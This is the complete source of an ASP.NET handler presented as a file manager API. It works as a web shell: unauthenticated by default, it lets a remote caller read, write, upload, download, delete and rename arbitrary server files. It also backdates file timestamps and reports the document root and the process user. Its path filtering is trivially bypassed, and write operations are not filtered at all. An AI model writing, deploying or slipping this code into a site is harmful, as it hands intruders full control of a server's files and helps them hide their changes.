<%@ WebHandler Language="C#" Class="FileManagerApi" %>
using System;
using System.IO;
using System.Web;
using System.Web.Script.Serialization;
using System.Collections.Generic;

public class FileManagerApi : IHttpHandler
{
    private HttpContext ctx;
    private HttpRequest Request { get { return ctx.Request; } }
    private HttpResponse Response { get { return ctx.Response; } }

    public void ProcessRequest(HttpContext context)
    {
        ctx = context;
        Response.ContentType = "application/json";
        Response.Charset = "utf-8";

        string action = GetP("action");
        if (string.IsNullOrEmpty(action)) return;

        string password = GetP("password");
        string PASSWORD = "your_password_here";

        if (!string.IsNullOrEmpty(PASSWORD) && PASSWORD != "your_password_here")
        {
            if (password != PASSWORD)
            {
                Response.StatusCode = 401;
                Response.Write("{\"success\":false,\"data\":null,\"message\":\"Unauthorized\"}");
                return;
            }
        }

        string result = "";
        try
        {
            if (action == "list") result = DoList();
            else if (action == "read") result = DoRead();
            else if (action == "write") result = DoWrite();
            else if (action == "mkdir") result = DoMkdir();
            else if (action == "delete") result = DoDelete();
            else if (action == "rename") result = DoRename();
            else if (action == "upload") result = DoUpload();
            else if (action == "download") { DoDownload(); return; }
            else if (action == "touch") result = DoTouch();
            else if (action == "info") result = DoInfo();
            else if (action == "server") result = DoServer();
            else result = ToJson(false, null, "Unknown action");
        }
        catch (Exception ex)
        {
            result = ToJson(false, null, ex.Message);
        }
        Response.Write(result);
    }

    public bool IsReusable { get { return false; } }

    string GetP(string k)
    {
        string v = Request.QueryString[k];
        if (string.IsNullOrEmpty(v)) v = Request.Form[k];
        return v;
    }

    string DefDir() { return Path.GetDirectoryName(Request.PhysicalPath); }

    string FixPath(string p)
    {
        if (string.IsNullOrEmpty(p) || p == "/") return DefDir();
        p = p.Replace("../", "").Replace("..\\", "");
        try { return Path.GetFullPath(p); } catch { return p; }
    }

    string ToJson(bool ok, object data, string msg)
    {
        Dictionary<string, object> r = new Dictionary<string, object>();
        r["success"] = ok;
        r["data"] = data;
        r["message"] = msg;
        return new JavaScriptSerializer().Serialize(r);
    }

    string FmtSize(long b)
    {
        if (b == 0) return "0 B";
        string[] u = new string[] { "B", "KB", "MB", "GB", "TB" };
        int i = (int)Math.Floor(Math.Log(b) / Math.Log(1024));
        if (i > 4) i = 4;
        return Math.Round(b / Math.Pow(1024, i), 2) + " " + u[i];
    }

    long ToUnix(DateTime dt)
    {
        return (long)(dt.ToUniversalTime() - new DateTime(1970, 1, 1)).TotalSeconds;
    }

    string DoList()
    {
        string p = FixPath(GetP("path"));
        if (!Directory.Exists(p)) return ToJson(false, null, "Not a valid directory");
        List<Dictionary<string, object>> items = new List<Dictionary<string, object>>();
        string root = Path.GetPathRoot(p);
        if (p != root && Directory.GetParent(p) != null)
        {
            Dictionary<string, object> parent = new Dictionary<string, object>();
            parent["name"] = "..";
            parent["path"] = Directory.GetParent(p).FullName;
            parent["is_dir"] = true;
            parent["size"] = 0;
            parent["size_formatted"] = "-";
            parent["mtime"] = 0;
            parent["perms"] = "drwxr-xr-x";
            parent["readable"] = true;
            parent["writable"] = true;
            items.Add(parent);
        }
        try
        {
            foreach (string d in Directory.GetDirectories(p))
            {
                DirectoryInfo di = new DirectoryInfo(d);
                Dictionary<string, object> item = new Dictionary<string, object>();
                item["name"] = di.Name;
                item["path"] = di.FullName;
                item["is_dir"] = true;
                item["size"] = 0;
                item["size_formatted"] = "-";
                item["mtime"] = ToUnix(di.LastWriteTime);
                item["perms"] = "drwxr-xr-x";
                item["readable"] = true;
                item["writable"] = true;
                items.Add(item);
            }
            foreach (string f in Directory.GetFiles(p))
            {
                FileInfo fi = new FileInfo(f);
                Dictionary<string, object> item = new Dictionary<string, object>();
                item["name"] = fi.Name;
                item["path"] = fi.FullName;
                item["is_dir"] = false;
                item["size"] = fi.Length;
                item["size_formatted"] = FmtSize(fi.Length);
                item["mtime"] = ToUnix(fi.LastWriteTime);
                item["perms"] = "-rwxr-xr-x";
                item["readable"] = true;
                item["writable"] = !fi.IsReadOnly;
                items.Add(item);
            }
        }
        catch (Exception ex) { return ToJson(false, null, ex.Message); }
        Dictionary<string, object> data = new Dictionary<string, object>();
        data["path"] = p;
        data["items"] = items;
        return ToJson(true, data, "");
    }

    string DoRead()
    {
        string p = FixPath(GetP("path"));
        if (!File.Exists(p)) return ToJson(false, null, "File not found");
        try
        {
            string content = File.ReadAllText(p);
            Dictionary<string, object> data = new Dictionary<string, object>();
            data["path"] = p;
            data["content"] = content;
            data["size"] = content.Length;
            return ToJson(true, data, "");
        }
        catch (Exception ex) { return ToJson(false, null, ex.Message); }
    }

    string DoWrite()
    {
        string p = GetP("path");
        string content = Request.Form["content"];
        if (string.IsNullOrEmpty(p)) return ToJson(false, null, "Path empty");
        if (content == null) content = "";
        try
        {
            File.WriteAllText(p, content);
            Dictionary<string, object> data = new Dictionary<string, object>();
            data["bytes"] = content.Length;
            return ToJson(true, data, "Saved");
        }
        catch (Exception ex) { return ToJson(false, null, ex.Message); }
    }

    string DoMkdir()
    {
        string p = GetP("path");
        if (string.IsNullOrEmpty(p)) return ToJson(false, null, "Path empty");
        if (Directory.Exists(p)) return ToJson(false, null, "Already exists");
        try { Directory.CreateDirectory(p); return ToJson(true, null, "Created"); }
        catch (Exception ex) { return ToJson(false, null, ex.Message); }
    }

    string DoDelete()
    {
        string p = FixPath(GetP("path"));
        try
        {
            if (Directory.Exists(p)) Directory.Delete(p, true);
            else if (File.Exists(p)) File.Delete(p);
            else return ToJson(false, null, "Not found");
            return ToJson(true, null, "Deleted");
        }
        catch (Exception ex) { return ToJson(false, null, ex.Message); }
    }

    string DoRename()
    {
        string oldP = FixPath(GetP("old_path"));
        string newP = GetP("new_path");
        if (string.IsNullOrEmpty(newP)) return ToJson(false, null, "New path empty");
        try
        {
            if (Directory.Exists(oldP)) Directory.Move(oldP, newP);
            else if (File.Exists(oldP)) File.Move(oldP, newP);
            else return ToJson(false, null, "Not found");
            return ToJson(true, null, "Renamed");
        }
        catch (Exception ex) { return ToJson(false, null, ex.Message); }
    }

    string DoUpload()
    {
        string dir = FixPath(GetP("dir"));
        if (Request.Files.Count == 0) return ToJson(false, null, "No file");
        try
        {
            HttpPostedFile f = Request.Files[0];
            string target = Path.Combine(dir, Path.GetFileName(f.FileName));
            f.SaveAs(target);
            Dictionary<string, object> data = new Dictionary<string, object>();
            data["path"] = target;
            return ToJson(true, data, "Uploaded");
        }
        catch (Exception ex) { return ToJson(false, null, ex.Message); }
    }

    void DoDownload()
    {
        string p = FixPath(GetP("path"));
        if (!File.Exists(p))
        {
            Response.StatusCode = 404;
            Response.ContentType = "text/plain";
            Response.Write("Not found");
            return;
        }
        Response.Clear();
        Response.ContentType = "application/octet-stream";
        Response.AddHeader("Content-Disposition", "attachment; filename=\"" + Path.GetFileName(p) + "\"");
        Response.TransmitFile(p);
    }

    string DoTouch()
    {
        string p = FixPath(GetP("path"));
        string ts = GetP("time");
        try
        {
            DateTime dt = DateTime.Now;
            if (!string.IsNullOrEmpty(ts))
            {
                long sec = long.Parse(ts);
                dt = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc).AddSeconds(sec).ToLocalTime();
            }
            if (Directory.Exists(p)) Directory.SetLastWriteTime(p, dt);
            else if (File.Exists(p)) File.SetLastWriteTime(p, dt);
            else return ToJson(false, null, "Not found");
            return ToJson(true, null, "Modified");
        }
        catch (Exception ex) { return ToJson(false, null, ex.Message); }
    }

    string DoInfo()
    {
        string p = FixPath(GetP("path"));
        bool isDir = Directory.Exists(p);
        bool isFile = File.Exists(p);
        if (!isDir && !isFile) return ToJson(false, null, "Not found");
        Dictionary<string, object> data = new Dictionary<string, object>();
        data["path"] = p;
        data["name"] = Path.GetFileName(p);
        data["is_dir"] = isDir;
        if (isFile)
        {
            FileInfo fi = new FileInfo(p);
            data["size"] = fi.Length;
            data["size_formatted"] = FmtSize(fi.Length);
            data["mtime"] = ToUnix(fi.LastWriteTime);
            data["ctime"] = ToUnix(fi.CreationTime);
            data["atime"] = ToUnix(fi.LastAccessTime);
        }
        else
        {
            DirectoryInfo di = new DirectoryInfo(p);
            data["size"] = 0;
            data["size_formatted"] = "-";
            data["mtime"] = ToUnix(di.LastWriteTime);
            data["ctime"] = ToUnix(di.CreationTime);
            data["atime"] = ToUnix(di.LastAccessTime);
        }
        data["perms"] = isDir ? "drwxr-xr-x" : "-rwxr-xr-x";
        data["perms_octal"] = "0755";
        data["readable"] = true;
        data["writable"] = true;
        data["owner"] = 0;
        data["group"] = 0;
        return ToJson(true, data, "");
    }

    string DoServer()
    {
        long diskFree = 0, diskTotal = 0;
        try
        {
            DriveInfo dr = new DriveInfo(Path.GetPathRoot(Request.PhysicalPath));
            diskFree = dr.AvailableFreeSpace;
            diskTotal = dr.TotalSize;
        }
        catch { }
        Dictionary<string, object> data = new Dictionary<string, object>();
        data["php_version"] = Environment.Version.ToString();
        data["server_software"] = Request.ServerVariables["SERVER_SOFTWARE"] ?? "IIS";
        data["document_root"] = Request.PhysicalApplicationPath;
        data["script_path"] = Request.PhysicalPath;
        data["upload_max"] = "30M";
        data["post_max"] = "30M";
        data["disk_free"] = FmtSize(diskFree);
        data["disk_total"] = FmtSize(diskTotal);
        data["current_user"] = Environment.UserName;
        return ToJson(true, data, "");
    }
}